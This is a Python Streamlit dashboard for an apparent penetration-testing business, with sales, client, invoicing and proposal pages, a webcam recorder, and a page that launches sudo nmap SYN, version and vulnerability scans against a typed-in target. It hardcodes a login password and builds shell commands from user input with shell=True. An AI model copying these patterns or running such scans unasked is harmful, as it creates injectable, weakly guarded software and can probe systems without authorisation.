import streamlit as st
import pandas as pd
import json
import os
from datetime import datetime, timedelta

import subprocess
import time

# Import OSI Document Generator
from osi_doc_generator import OSIDocumentGenerator

# Import Business Intelligence Modules
from osi_biz import PricingEngine, CompetitorDatabase, ProposalGenerator, CaseStudyBuilder

# Database Files
DB_FILE = "clients.json"
LEADS_FILE = "leads.json"

st.set_page_config(page_title="OSI Mission Control", page_icon="üïµÔ∏è", layout="wide")

# Styling - HACKER NEON GREEN THEME
st.markdown("""
<style>
    /* Main app background */
    .stApp {
        background-color: #0a0e0f;
        color: #00ff41;
    }
    
    /* All text elements */
    .stMarkdown, .stText, p, span, div {
        color: #00ff41 !important;
    }
    
    /* Headers */
    h1, h2, h3, h4, h5, h6 {
        color: #00ff00 !important;
        text-shadow: 0 0 10px #00ff41;
    }
    
    /* Sidebar */
    section[data-testid="stSidebar"] {
        background-color: #0d1117;
        border-right: 2px solid #00ff41;
    }
    
    section[data-testid="stSidebar"] * {
        color: #00ff41 !important;
    }
    
    /* Metric cards */
    .metric-card {
        background-color: #1a1f1a;
        padding: 20px;
        border-radius: 10px;
        border: 2px solid #00ff41;
        box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
    }
    
    /* Buttons */
    .stButton > button {
        background-color: #003300;
        color: #00ff41 !important;
        border: 2px solid #00ff41;
        box-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
    }
    
    .stButton > button:hover {
        background-color: #005500;
        box-shadow: 0 0 20px rgba(0, 255, 65, 0.6);
    }
    
    /* Input fields */
    .stTextInput > div > div > input,
    .stTextArea > div > div > textarea,
    .stSelectbox > div > div > select {
        background-color: #0d1117;
        color: #00ff41 !important;
        border: 2px solid #00ff41;
    }
    
    /* Expanders */
    .streamlit-expanderHeader {
        background-color: #0d1117;
        color: #00ff41 !important;
        border: 1px solid #00ff41;
    }
    
    /* Info/Success/Warning boxes */
    .stAlert {
        background-color: #0d1117;
        border: 2px solid #00ff41;
        color: #00ff41 !important;
    }
    
    /* Tables */
    table {
        color: #00ff41 !important;
        border: 1px solid #00ff41;
    }
    
    /* Code blocks */
    code {
        background-color: #0d1117;
        color: #00ff00;
        border: 1px solid #00ff41;
    }
</style>
""", unsafe_allow_html=True)

# Helper Functions
def load_json(path):
    if not os.path.exists(path): return []
    try:
        with open(path, 'r') as f: return json.load(f)
    except: return []

def save_json(path, data):
    with open(path, 'w') as f: json.dump(data, f, indent=4)

def get_tier_details(tier):
    if tier == "Tier 1 ($1k)": return 1000, 4
    if tier == "Tier 2 ($2.5k)": return 2500, 10
    if tier == "Tier 3 ($5k)": return 5000, 25
    return 0, 0

# Helper Functions
def check_password():
    """Returns `True` if the user had the correct password."""
    def password_entered():
        if st.session_state["password"] == "osi2025": # Simple password for local dev
            st.session_state["password_correct"] = True
            del st.session_state["password"]  # don't store password
        else:
            st.session_state["password_correct"] = False

    if "password_correct" not in st.session_state:
        # First run, show input
        st.text_input("Security Clearance Code", type="password", on_change=password_entered, key="password")
        return False
    elif not st.session_state["password_correct"]:
        # Password incorrect, show input + error
        st.text_input("Security Clearance Code", type="password", on_change=password_entered, key="password")
        st.error("üòï ACCESS DENIED")
        return False
    else:
        # Password correct
        return True

def validate_ip(ip):
    import re
    # Simple IPv4 check or hostname
    pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$|^[a-zA-Z0-9.-]+$")
    return pattern.match(ip)

if not check_password():
    st.stop()  # Stop execution if not logged in

# Main App
st.title("OSI MISSION CONTROL üïµÔ∏è")
st.markdown("---")

# Sidebar - Navigation
page = st.sidebar.radio("Navigation", [
    "üöÄ Launchpad", 
    "üî• Pentesting Log",
    "ü•ã OSI Training Dojo",
    "üëÅÔ∏è Vision Systems", 
    "üì° Network Scanner",
    "ü§ñ Agent Manager",
    "üéº Master Orchestrator", 
    "üíº Sales Pipeline", 
    "üë• Client Manager",
    "üìÑ Document Generator",
    "üí∞ Pricing Calculator",
    "üéØ Proposal Generator",
    "‚öîÔ∏è Competitive Intel",
    "üìä Case Studies"
])

clients = load_json(DB_FILE)
leads = load_json(LEADS_FILE)

if page == "üöÄ Launchpad":
    st.header("Systems Status")
    
    col1, col2, col3 = st.columns(3)
    col1.metric("Core System", "ONLINE", delta="Active")
    col2.metric("AI Engine (Ollama)", "STANDBY", delta_color="off")
    col3.metric("Field Agents", "0 ACTIVE", delta_color="inverse")
    
    st.subheader("Quick Launch")
    
    c1, c2, c3, c4 = st.columns(4)
    if c1.button("RUN SCOUT (Scan)", use_container_width=True):
        st.info("Launch 'Network Scanner' tab to configure scan.")
        
    if c2.button("START VISION", use_container_width=True):
        st.info("Launch 'Vision Systems' tab to view feeds.")
        
    if c3.button("BUILD AGENT (Rust)", use_container_width=True):
        with st.spinner("Compiling OSI Agent..."):
            subprocess.run("cd osi-agent && cargo build --release", shell=True)
            st.success("Agent Built! Check osi-agent/target/release/")
            
    if c4.button("OPEN CORTEX (AI)", use_container_width=True):
        st.success("Cortex is running on port 8502 (Launch separately for now)")

elif page == "üì° Network Scanner":
    st.header("OSI SCOUT - Remote Scanner")
    
    with st.container(border=True):
        target_ip = st.text_input("Target IP / Range", "scanme.nmap.org")
        mode = st.selectbox("Scan Mode", ["Quick (Syn)", "Full (Version+Script)", "5G Audit", "Vuln Scan"])
        
        if st.button("üöÄ INITIATE SCAN", type="primary"):
            if not validate_ip(target_ip):
                st.error("‚ùå Invalid IP Address or Hostname. Scan Aborted.")
            else:
                st.markdown("### üìú Real-time Logs")
                log_box = st.empty()
                
                # Construct Command
                nmap_args = "-sS"
                if mode == "Full (Version+Script)": nmap_args = "-sV -sC"
                elif mode == "Vuln Scan": nmap_args = "--script=vuln"
                
                cmd = f"sudo nmap {nmap_args} {target_ip}"
                
                with st.spinner(f"Scanning {target_ip}..."):
                    # Real-time output simulation for Streamlit
                    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    output_log = ""
                    while True:
                        line = process.stdout.readline()
                        if not line and process.poll() is not None:
                            break
                        if line:
                            output_log += line
                            log_box.code(output_log, language="bash")
                    st.success("Scan Complete!")

elif page == "üëÅÔ∏è Vision Systems":
    st.header("OSI VISION - Surveillance Hub")
    
    tab1, tab2 = st.tabs(["Live Feed", "Visual Search"])
    
    with tab1:
        st.warning("Webcam Streaming requires local browser access or IP Camera URL.")
        if st.button("Start Headless Recorder"):
            subprocess.Popen(["./venv/bin/python", "osi_vision.py", "--mode", "record", "--headless"])
            st.success("Vision Engine running in background (Logs to ChromaDB)")
            
    with tab2:
        query = st.text_input("Search Video Logs", placeholder="e.g. 'Person wearing red shirt'")
        if st.button("Search Memory"):
            # Mock result for now, would connect to ChromaDB
            st.info(f"Searching for '{query}'...")
            st.image("https://via.placeholder.com/640x360?text=Match+Found:+Timestamp+12:04:33", caption="Match 98%")

if page == "üéº Master Orchestrator":
    st.header(f"Good Morning, Ryan. It is {datetime.now().strftime('%A, %B %d')}.")
    # ... logic continues ...
    
    # 1. Pipeline Snapshot
    st.subheader("üöÄ Active Deals")
    st.markdown(f"**Total Leads:** {len(leads)}")
    # Count by stage
    stages = [l['stage'] for l in leads]
    cols = st.columns(4)
    cols[0].metric("Discovery", stages.count("Discovery"))
    cols[1].metric("Proposal", stages.count("Proposal"))
    cols[2].metric("Negotiation", stages.count("Negotiation"))
    cols[3].metric("Closing", stages.count("Closing"))
    
    # 2. Financial Snapshot
    st.subheader("üí∞ Revenue Pulse")
    total_mrr = sum([c['mrr'] for c in clients])
    st.metric("Monthly Recurring Revenue (MRR)", f"${total_mrr:,}", help="Goal: $20k")
    
    # 3. Critical Alerts
    st.subheader("‚ö° Immediate Actions")
    alerts = []
    # Check for stalled leads
    for l in leads:
        last_touch = datetime.strptime(l['date_added'], "%Y-%m-%d") # Simplified, real app needs 'last_activity'
        days_stalled = (datetime.now() - last_touch).days
        if days_stalled > 7:
            alerts.append(f"STALLED DEAL: {l['name']} (No activity for {days_stalled} days)")
            
    # Check for retainer utilization
    for c in clients:
        util = c.get('hours_used', 0) / c['hours_limit']
        if util > 0.9:
            alerts.append(f"OVERAGE RISK: {c['name']} at {util*100:.0f}% usage")
            
    if alerts:
        for a in alerts:
            st.error(a)
    else:
        st.success("All systems nominal. No critical alerts.")

elif page == "üíº Sales Pipeline":
    st.header("Sales Pipeline Management")
    
    with st.expander("Add New Lead", expanded=False):
        with st.form("new_lead"):
            c1, c2 = st.columns(2)
            name = c1.text_input("Prospect Name")
            value = c2.number_input("Estimated Value ($)", step=500)
            stage = st.selectbox("Stage", ["Discovery", "Assessment", "Proposal", "Negotiation", "Closing"])
            notes = st.text_area("Initial Notes")
            
            if st.form_submit_button("Create Lead"):
                new_l = {
                    "id": len(leads)+1, "name": name, "value": value, "stage": stage,
                    "notes": notes, "date_added": datetime.now().strftime("%Y-%m-%d")
                }
                leads.append(new_l)
                save_json(LEADS_FILE, leads)
                st.rerun()
    
    # Kanban Board (Simplified as columns)
    cols = st.columns(5)
    stages = ["Discovery", "Assessment", "Proposal", "Negotiation", "Closing"]
    
    for i, s in enumerate(stages):
        with cols[i]:
            st.markdown(f"### {s}")
            for l in [x for x in leads if x['stage'] == s]:
                with st.expander(f"{l['name']} (${l['value']})"):
                    st.write(l['notes'])
                    next_stage = st.selectbox("Move to:", stages + ["Won", "Lost"], key=f"move_{l['id']}", index=i)
                    if next_stage != s:
                        if next_stage == "Won":
                            # Convert to Client!
                            st.balloons()
                            leads.remove(l)
                            save_json(LEADS_FILE, leads)
                            # Add semi-filled client
                            clients.append({
                                "id": len(clients)+1, "name": l['name'], "mrr": 0, "tier": "Tier 1", 
                                "hours_limit": 4, "contact": "TBD", "hours_used": 0,
                                "joined": datetime.now().strftime("%Y-%m-%d")
                            })
                            save_json(DB_FILE, clients)
                            st.success(f"{l['name']} Converted to Client!")
                        elif next_stage == "Lost":
                            leads.remove(l)
                            save_json(LEADS_FILE, leads)
                        else:
                            l['stage'] = next_stage
                            save_json(LEADS_FILE, leads)
                        st.rerun()

elif page == "üë• Client Manager":
    st.header("Client Management")
    
    with st.expander("Add Existing Client (Manual)", expanded=False):
        with st.form("new_client"):
            col1, col2 = st.columns(2)
            name = col1.text_input("Name")
            contact = col2.text_input("POC Email")
            tier = st.selectbox("Retainer Tier", ["Tier 1 ($1k)", "Tier 2 ($2.5k)", "Tier 3 ($5k)"])
            
            if st.form_submit_button("Onboard Client"):
                mrr, hours = get_tier_details(tier)
                new_c = {
                    "id": len(clients) + 1, "name": name, "contact": contact,
                    "tier": tier, "mrr": mrr, "hours_limit": hours, "hours_used": 0,
                    "joined": datetime.now().strftime("%Y-%m-%d")
                }
                clients.append(new_c)
                save_json(DB_FILE, clients)
                st.rerun()

    if not clients:
        st.info("No Active Clients.")
    else:
        for c in clients:
            with st.expander(f"{c['name']} - {c['tier']}"):
                c1, c2, c3 = st.columns(3)
                c1.metric("MRR", f"${c['mrr']}")
                c2.metric("Hours", f"{c.get('hours_used',0)}/{c['hours_limit']}")
                c3.write(f"**Contact:** {c.get('contact', 'N/A')}")
                
                if st.button("Delete Client", key=f"del_{c['id']}"):
                    clients.remove(c)
                    save_json(DB_FILE, clients)
                    st.rerun()

elif page == "Time Tracker":
    st.header("Consultant Time Logger")
    if not clients:
        st.warning("No clients.")
    else:
        c_name = st.selectbox("Client", [c['name'] for c in clients])
        client = next(x for x in clients if x['name'] == c_name)
        
        with st.form("log_time"):
            hrs = st.number_input("Hours", 0.5, 10.0, 1.0)
            note = st.text_input("Description")
            if st.form_submit_button("Log Time"):
                client['hours_used'] += hrs
                save_json(DB_FILE, clients)
                st.success("Logged.")

elif page == "Reports":
    st.header("Operations Reports")
    rpt = st.selectbox("Type", ["Monthly Invoice"])
    if clients:
        c_name = st.selectbox("Client", [c['name'] for c in clients])
        target = next(c for c in clients if c['name'] == c_name)
        if st.button("Generate"):
            # Mock generation for display
            st.success(f"Invoice for {target['name']} generated!")

elif page == "üìÑ Document Generator":
    st.header("üìÑ OSI Document Generator")
    st.markdown("*Auto-generate professional business documents from templates*")
    
    # Available templates
    templates = {
        "Invoice": "OSI_Invoice_Template.docx",
        "NDA": "OSI_NDA_Template.docx",
        "Master Service Agreement": "OSI_Master_Service_Agreement.docx",
        "Statement of Work": "OSI_Statement_of_Work_Template.docx",
        "Client Onboarding Packet": "OSI_Client_Onboarding_Packet.docx"
    }
    
    doc_type = st.selectbox("Select Document Type", list(templates.keys()))
    
    if clients:
        client_name = st.selectbox("Select Client", [c['name'] for c in clients] + ["New Client (Manual Entry)"])
        
        if client_name == "New Client (Manual Entry)":
            with st.form("manual_client_info"):
                st.subheader("Client Information")
                c1, c2 = st.columns(2)
                manual_name = c1.text_input("Company Name", "")
                manual_contact = c2.text_input("Contact Person", "")
                manual_email = c1.text_input("Email", "")
                manual_phone = c2.text_input("Phone", "")
                manual_address = st.text_area("Address", "")
                
                if doc_type == "Invoice":
                    st.subheader("Invoice Details")
                    inv_date = st.date_input("Invoice Date", datetime.now())
                    inv_amount = st.number_input("Amount ($)", min_value=0.0, step=100.0)
                    inv_description = st.text_area("Services Description", "")
                
                elif doc_type == "Statement of Work":
                    st.subheader("SOW Details")
                    project_name = st.text_input("Project Name", "")
                    start_date = st.date_input("Start Date", datetime.now())
                    end_date = st.date_input("End Date", datetime.now() + timedelta(days=30))
                    sow_description = st.text_area("Scope of Work", "")
                    deliverables = st.text_area("Deliverables (one per line)", "")
                
                submit = st.form_submit_button("Generate Document")
                
                if submit and manual_name:
                    template_path = f"./templates/business/{templates[doc_type]}"
                    
                    if os.path.exists(template_path):
                        # For now, show success message
                        # In production, you'd use python-docx to fill template
                        st.success(f"‚úÖ {doc_type} generated for {manual_name}!")
                        st.info(f"Template: {templates[doc_type]}")
                        st.markdown(f"""
                        **Document would include:**
                        - Client: {manual_name}
                        - Contact: {manual_contact}
                        - Email: {manual_email}
                        - Phone: {manual_phone}
                        """)
                        
                        if doc_type == "Invoice" and 'inv_amount' in locals():
                            st.markdown(f"- **Amount:** ${inv_amount:,.2f}")
                            st.markdown(f"- **Services:** {inv_description}")
                        
                        st.download_button(
                            label="üì• Download Template (Manual Fill)",
                            data=open(template_path, 'rb').read(),
                            file_name=f"{doc_type}_{manual_name.replace(' ', '_')}.docx",
                            mime="application/vnd.openxmlformats-officedocument.wordprocessingml.document"
                        )
                    else:
                        st.error(f"Template not found: {template_path}")
        else:
            # Use existing client data
            client = next((c for c in clients if c['name'] == client_name), None)
            if client:
                st.subheader(f"Generate {doc_type} for {client['name']}")
                
                with st.form("gen_doc"):
                    if doc_type == "Invoice":
                        inv_date = st.date_input("Invoice Date", datetime.now())
                        inv_number = st.text_input("Invoice Number", f"INV-{datetime.now().strftime('%Y%m%d')}")
                        inv_amount = st.number_input("Amount ($)", value=float(client.get('mrr', 0)), step=100.0)
                        inv_description = st.text_area("Services Description", f"Monthly Retainer - {client.get('tier', 'N/A')}")
                    
                    elif doc_type == "NDA":
                        st.info("NDA will be generated with standard OSI terms")
                    
                    elif doc_type == "Statement of Work":
                        project_name = st.text_input("Project Name", "Security Assessment")
                        start_date = st.date_input("Start Date", datetime.now())
                        end_date = st.date_input("End Date", datetime.now() + timedelta(days=30))
                        sow_description = st.text_area("Scope of Work", "Comprehensive penetration testing of web applications, network infrastructure, and wireless systems.")
                        deliverables = st.text_area("Deliverables (one per line)", "Executive Summary Report\nDetailed Technical Findings\nRemediation Roadmap\nRe-test (30 days)")
                        sow_amount = st.number_input("Project Value ($)", min_value=0.0, step=500.0, value=5000.0)
                    
                    submit = st.form_submit_button("üéØ Generate PDF", type="primary")
                    
                    if submit:
                        doc_gen = OSIDocumentGenerator()
                        
                        try:
                            if doc_type == "Invoice":
                                client_data = {
                                    'name': client['name'],
                                    'contact': client.get('contact', ''),
                                    'email': client.get('email', '')
                                }
                                invoice_data = {
                                    'number': inv_number,
                                    'date': inv_date.strftime('%B %d, %Y'),
                                    'amount': inv_amount,
                                    'description': inv_description
                                }
                                pdf = doc_gen.fill_invoice(client_data, invoice_data)
                                filename = f"Invoice_{client_name.replace(' ', '_')}_{datetime.now().strftime('%Y%m%d')}.pdf"
                                
                                # Save and provide download
                                filepath = doc_gen.save_pdf(pdf, filename)
                                st.success(f"‚úÖ Invoice PDF Generated!")
                                st.balloons()
                                
                                with open(filepath, 'rb') as f:
                                    st.download_button(
                                        label="üì• Download Invoice PDF",
                                        data=f.read(),
                                        file_name=filename,
                                        mime="application/pdf",
                                        type="primary"
                                    )
                                st.info(f"üìÅ Saved to: {filepath}")
                                
                                # Email send option
                                st.markdown("---")
                                st.subheader("üìß Email Invoice")
                                client_email = st.text_input("Client Email", client.get('email', ''))
                                
                                if st.button("üì® Send via Email", key="email_invoice"):
                                    if client_email:
                                        from osi_email import OSIEmailer
                                        emailer = OSIEmailer()
                                        success, message = emailer.send_invoice(
                                            client_email,
                                            client_name,
                                            filepath,
                                            inv_amount
                                        )
                                        if success:
                                            st.success(f"‚úÖ {message}")
                                        else:
                                            st.error(f"‚ùå {message}")
                                            if "credentials not configured" in message:
                                                st.info("üí° Set OSI_EMAIL and OSI_EMAIL_PASSWORD environment variables to enable email")
                                    else:
                                        st.warning("Please enter client email address")
                            
                            elif doc_type == "NDA":
                                party1_data = {'name': 'On-Site Intelligence LLC'}
                                party2_data = {'name': client['name']}
                                pdf = doc_gen.fill_nda(party1_data, party2_data)
                                filename = f"NDA_{client_name.replace(' ', '_')}_{datetime.now().strftime('%Y%m%d')}.pdf"
                                
                                filepath = doc_gen.save_pdf(pdf, filename)
                                st.success(f"‚úÖ NDA PDF Generated!")
                                st.balloons()
                                
                                with open(filepath, 'rb') as f:
                                    st.download_button(
                                        label="üì• Download NDA PDF",
                                        data=f.read(),
                                        file_name=filename,
                                        mime="application/pdf",
                                        type="primary"
                                    )
                                st.info(f"üìÅ Saved to: {filepath}")
                            
                            elif doc_type == "Statement of Work":
                                client_data = {'name': client['name']}
                                project_data = {
                                    'name': project_name,
                                    'start_date': start_date.strftime('%B %d, %Y'),
                                    'end_date': end_date.strftime('%B %d, %Y'),
                                    'duration': f"{(end_date - start_date).days} days",
                                    'scope': sow_description,
                                    'deliverables': deliverables,
                                    'amount': sow_amount
                                }
                                pdf = doc_gen.fill_sow(client_data, project_data)
                                filename = f"SOW_{client_name.replace(' ', '_')}_{datetime.now().strftime('%Y%m%d')}.pdf"
                                
                                filepath = doc_gen.save_pdf(pdf, filename)
                                st.success(f"‚úÖ Statement of Work PDF Generated!")
                                st.balloons()
                                
                                with open(filepath, 'rb') as f:
                                    st.download_button(
                                        label="üì• Download SOW PDF",
                                        data=f.read(),
                                        file_name=filename,
                                        mime="application/pdf",
                                        type="primary"
                                    )
                                st.info(f"üìÅ Saved to: {filepath}")
                                
                                # Email send option
                                st.markdown("---")
                                st.subheader("üìß Email Invoice")
                                client_email = st.text_input("Client Email", client.get('email', ''))
                                
                                if st.button("üì® Send via Email", key="email_invoice"):
                                    if client_email:
                                        from osi_email import OSIEmailer
                                        emailer = OSIEmailer()
                                        success, message = emailer.send_invoice(
                                            client_email,
                                            client_name,
                                            filepath,
                                            inv_amount
                                        )
                                        if success:
                                            st.success(f"‚úÖ {message}")
                                        else:
                                            st.error(f"‚ùå {message}")
                                            if "credentials not configured" in message:
                                                st.info("üí° Set OSI_EMAIL and OSI_EMAIL_PASSWORD environment variables to enable email")
                                    else:
                                        st.warning("Please enter client email address")
                            else:
                                # For non-invoice docs, use template for now
                                template_path = f"./templates/business/{templates[doc_type]}"
                                if os.path.exists(template_path):
                                    st.success(f"‚úÖ {doc_type} generated!")
                                    st.download_button(
                                        label="üì• Download Document",
                                        data=open(template_path, 'rb').read(),
                                        file_name=f"{doc_type}_{client_name.replace(' ', '_')}_{datetime.now().strftime('%Y%m%d')}.docx",
                                        mime="application/vnd.openxmlformats-officedocument.wordprocessingml.document"
                                    )
                                else:
                                    st.error(f"Template not found: {template_path}")
                        except Exception as e:
                            st.error(f"‚ùå Error: {str(e)}")
    else:
        st.warning("No clients found. Add a client first or use manual entry.")
    
    # Template Library
    st.markdown("---")
    st.subheader("üìö Template Library")
    for name, filename in templates.items():
        path = f"./templates/business/{filename}"
        if os.path.exists(path):
            st.markdown(f"‚úÖ **{name}** - `{filename}`")
        else:
            st.markdown(f"‚ùå **{name}** - `{filename}` (Missing)")

# ==================== BUSINESS ARSENAL ====================

elif page == "üí∞ Pricing Calculator":
    st.header("üí∞ OSI Pricing Calculator")
    st.markdown("*Dynamic pricing based on service, industry, and complexity*")
    
    pricing_engine = PricingEngine()
    
    col1, col2 = st.columns(2)
    
    with col1:
        service = st.selectbox("Service Type", list(pricing_engine.base_rates.keys()))
        size = st.selectbox("Engagement Size", list(pricing_engine.base_rates[service].keys()))
        
    with col2:
        industry = st.selectbox("Client Industry", list(pricing_engine.multipliers["Industry"].keys()))
        complexity = st.selectbox("Complexity", list(pricing_engine.multipliers["Complexity"].keys()))
        urgency = st.selectbox("Urgency", list(pricing_engine.multipliers["Urgency"].keys()))
    
    if st.button("Calculate Price", type="primary"):
        price, breakdown = pricing_engine.calculate_price(service, size, industry, complexity, urgency)
        
        st.success(f"### Recommended Price: ${price:,.2f}")
        
        st.subheader("Price Breakdown:")
        st.write(f"**Base Rate ({service} - {size}):** ${breakdown['Base']:,}")
        st.write(f"**Industry Multiplier ({industry}):** {breakdown['Industry']}")
        st.write(f"**Complexity Multiplier ({complexity}):** {breakdown['Complexity']}")
        st.write(f"**Urgency Multiplier ({urgency}):** {breakdown['Urgency']}")
        
        # Price range recommendation
        low = price * 0.9
        high = price * 1.15
        st.info(f"üí° **Pricing Range:** ${low:,.2f} - ${high:,.2f}")
        st.caption("Quote the high end for initial proposals, negotiate down if needed.")
    
    # Budget-based recommendations
    st.markdown("---")
    st.subheader("Budget-Based Recommendations")
    budget = st.number_input("Client Budget ($)", min_value=500, step=500, value=5000)
    rec_industry = st.selectbox("Industry for Recommendations", list(pricing_engine.multipliers["Industry"].keys()), key="rec_ind")
    
    if st.button("Get Recommendations"):
        recs = pricing_engine.get_recommended_package(budget, rec_industry)
        if recs:
            st.write(f"Top 5 services that fit ${budget:,} budget:")
            for i, rec in enumerate(recs[:5], 1):
                fit_pct = rec['fit_score']
                st.write(f"{i}. **{rec['service']} ({rec['size']})** - ${rec['price']:,.2f} ({fit_pct:.0f}% of budget)")
        else:
            st.warning("No services fit this budget. Consider increasing budget or offering payment plans.")

elif page == "üéØ Proposal Generator":
    st.header("üéØ Proposal Generator")
    st.markdown("*Generate professional proposals in seconds*")
    
    prop_gen = ProposalGenerator()
    
    with st.form("proposal_form"):
        client_name = st.text_input("Client Name", "Acme Corporation")
        service_type = st.selectbox("Service Type", ["PenTest", "Retainer", "Custom"])
        investment = st.number_input("Investment Amount ($)", min_value=0.0, step=500.0, value=5000.0)
        
        st.subheader("Customize Scope")
        custom_scope = st.text_area("Scope of Work", 
            "Comprehensive penetration testing of web applications, network infrastructure, and wireless systems.")
        timeline = st.text_input("Timeline", "2-4 weeks")
        
        if st.form_submit_button("Generate Proposal", type="primary"):
            proposal = prop_gen.generate(client_name, service_type, custom_scope, timeline, investment)
            
            st.success("‚úÖ Proposal Generated!")
            st.balloons()
            
            # Display proposal
            st.markdown("---")
            st.markdown(f"## Proposal for {proposal['client']}")
            st.markdown(f"*Date: {proposal['date']}*")
            
            st.subheader("Introduction")
            st.write(proposal['intro'])
            
            st.subheader("Our Approach")
            st.write(proposal['approach'])
            
            st.subheader("Scope of Work")
            st.write(proposal['scope'])
            
            st.subheader("Deliverables")
            for d in proposal['deliverables']:
                st.write(f"‚Ä¢ {d}")
            
            st.subheader("Timeline")
            st.write(proposal['timeline'])
            
            st.subheader("Investment")
            st.write(f"**Total Investment:** {proposal['investment']}")
            st.caption(f"Valid until: {proposal['valid_until']}")
            
            # Copy to clipboard button (via text area)
            proposal_text = f"""
PROPOSAL FOR {proposal['client'].upper()}
Date: {proposal['date']}

{proposal['intro']}

OUR APPROACH
{proposal['approach']}

SCOPE OF WORK
{proposal['scope']}

DELIVERABLES
{chr(10).join('‚Ä¢ ' + d for d in proposal['deliverables'])}

TIMELINE
{proposal['timeline']}

INVESTMENT
{proposal['investment']}

Valid until: {proposal['valid_until']}
            """
            st.download_button(
                "üì• Download Proposal (Text)",
                data=proposal_text,
                file_name=f"Proposal_{client_name.replace(' ', '_')}.txt",
                mime="text/plain"
            )

elif page == "‚öîÔ∏è Competitive Intel":
    st.header("‚öîÔ∏è Competitive Intelligence")
    st.markdown("*Know your enemies, win more deals*")
    
    comp_db = CompetitorDatabase()
    
    tab1, tab2, tab3 = st.tabs(["üìä Battle Cards", "ü§ñ Auto-Research", "‚ûï Manual Add"])
    
    with tab1:
        competitors = comp_db.get_all()
        
        if not competitors:
            st.info("No competitors tracked yet. Use Auto-Research or Manual Add to populate.")
        else:
            # Metrics at top
            col1, col2, col3 = st.columns(3)
            col1.metric("Competitors Tracked", len(competitors))
            
            # Count auto vs manual
            auto_count = sum(1 for c in competitors if c.get('data_source') == 'Automated Research')
            col2.metric("Auto-Researched", auto_count)
            col3.metric("Manual Entries", len(competitors) - auto_count)
            
            st.markdown("---")
            
            for idx, comp in enumerate(competitors):
                with st.expander(f"üéØ {comp['name']}", expanded=False):
                    # Header info
                    if comp.get('data_source') == 'Automated Research':
                        st.caption(f"ü§ñ Auto-researched on {comp.get('last_updated', 'Unknown')[:10]}")
                    
                    col1, col2 = st.columns(2)
                    
                    with col1:
                        st.subheader("‚úÖ Their Strengths")
                        for s in comp.get('strengths', []):
                            st.write(f"‚Ä¢ {s}")
                        
                        st.subheader("üí∞ Their Pricing")
                        st.write(comp.get('pricing', 'Unknown'))
                        
                        if comp.get('target_market'):
                            st.subheader("üéØ Target Market")
                            st.write(comp['target_market'])
                    
                    with col2:
                        st.subheader("‚ùå Their Weaknesses")
                        for w in comp.get('weaknesses', []):
                            st.write(f"‚Ä¢ {w}")
                        
                        st.subheader("üèÜ How to Win")
                        st.info(comp.get('win_strategy', 'Emphasize OSI advantages'))
                    
                    # Delete button
                    st.markdown("---")
                    if st.button(f"üóëÔ∏è Delete {comp['name']}", key=f"delete_comp_{idx}"):
                        competitors.pop(idx)
                        comp_db.data = competitors
                        comp_db.save()
                        st.success(f"‚úÖ Deleted {comp['name']}")
                        st.rerun()
    
    with tab2:
        st.subheader("ü§ñ Automated Competitor Research")
        st.markdown("*AI-powered intelligence gathering*")
        
        st.warning("‚ö° This uses your local Ollama AI and web scraping. May take 1-2 minutes per competitor.")
        
        col1, col2 = st.columns(2)
        research_count = col1.number_input("Number of Competitors to Research", 1, 10, 5)
        industry_focus = col2.text_input("Industry Focus", "cybersecurity")
        
        if st.button("üöÄ START AUTO-RESEARCH", type="primary"):
            from osi_competitor_research import CompetitorResearchEngine
            
            with st.spinner(f"Researching top {research_count} competitors..."):
                progress_bar = st.progress(0)
                status_text = st.empty()
                
                engine = CompetitorResearchEngine()
                results = engine.batch_research(industry=industry_focus, count=research_count)
                
                # Save to database
                for i, intel in enumerate(results):
                    progress_bar.progress((i + 1) / len(results))
                    status_text.text(f"Analyzing {intel['name']}...")
                    
                    # Check if already exists
                    existing = comp_db.get_battle_card(intel['name'])
                    if not existing:
                        comp_db.add_competitor(
                            intel['name'],
                            intel['strengths'],
                            intel['weaknesses'],
                            intel['pricing'],
                            intel['win_strategy']
                        )
                
                st.success(f"‚úÖ Researched {len(results)} competitors!")
                st.balloons()
                st.rerun()
        
        # Preview known competitors
        st.markdown("---")
        st.subheader("Preview: Top Cybersecurity Competitors")
        st.markdown("""
        **Auto-research will analyze:**
        - CrowdStrike (Enterprise MSSP)
        - Mandiant (Incident Response)
        - Rapid7 (Vulnerability Management)
        - Bishop Fox (Pentesting)
        - Synack (Crowdsourced Security)
        - And more...
        """)
    
    with tab3:
        st.subheader("‚ûï Manual Competitor Entry")
        
        with st.form("new_competitor"):
            name = st.text_input("Competitor Name", "")
            pricing = st.text_input("Their Pricing Model", "$5k-15k/month")
            
            strengths_raw = st.text_area("Strengths (one per line)", "")
            weaknesses_raw = st.text_area("Weaknesses (one per line)", "")
            win_strategy = st.text_area("How to Beat Them", "")
            
            if st.form_submit_button("Add Competitor"):
                if name:
                    strengths = [s.strip() for s in strengths_raw.split('\n') if s.strip()]
                    weaknesses = [w.strip() for w in weaknesses_raw.split('\n') if w.strip()]
                    
                    comp_db.add_competitor(name, strengths, weaknesses, pricing, win_strategy)
                    st.success(f"‚úÖ Added {name} to competitive intel!")
                    st.rerun()
                else:
                    st.error("Please enter a competitor name")

elif page == "üìä Case Studies":
    st.header("üìä Case Study Library")
    st.markdown("*Turn wins into marketing gold*")
    
    case_db = CaseStudyBuilder()
    
    tab1, tab2 = st.tabs(["üìö Library", "‚ûï Create New"])
    
    with tab1:
        studies = case_db.get_all()
        
        if not studies:
            st.info("No case studies yet. Create one to showcase your wins!")
        else:
            # Filter by industry
            industries = list(set(s['industry'] for s in studies))
            filter_ind = st.selectbox("Filter by Industry", ["All"] + industries)
            
            if filter_ind != "All":
                studies = [s for s in studies if s['industry'] == filter_ind]
            
            for study in studies:
                with st.expander(f"üìã {study['industry']} Case Study #{study['id']}", expanded=False):
                    st.markdown(f"**Challenge:** {study['challenge']}")
                    st.markdown(f"**Solution:** {study['solution']}")
                    st.markdown(f"**Results:** {study['results']}")
                    
                    st.subheader("üìä Metrics")
                    cols = st.columns(len(study['metrics']))
                    for i, (key, value) in enumerate(study['metrics'].items()):
                        cols[i].metric(key.replace('_', ' ').title(), value)
                    
                    st.caption(f"Created: {study['created_date'][:10]}")
    
    with tab2:
        st.subheader("Create New Case Study")
        
        with st.form("new_case_study"):
            industry = st.selectbox("Industry", ["Healthcare", "Financial", "Manufacturing", "Technology", "Government", "Legal"])
